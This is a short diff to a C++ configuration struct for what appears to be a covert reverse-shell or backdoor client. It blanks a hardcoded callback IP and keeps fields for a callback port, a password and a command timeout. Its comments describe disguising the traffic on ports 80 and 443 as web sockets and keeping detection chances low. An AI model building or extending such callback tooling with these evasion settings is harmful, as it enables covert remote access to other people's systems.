@@ -19,7 +19,7 @@ using namespace std;
 
 struct gui_config{
     const string client_ver = "lol"; // client name 
-    const string client_patch = "104.131.75.159"; // host to call back to
+    const string client_patch = ""; // host to call back to
     const string client_buffer = "443"; // port to call back to port 80 and 443 will look like web sockets
     const string client_key = "lolpass"; // password
     const string client_time_out = "1"; // amount of time till a command will be killed, the smaller the time the less chance of detection
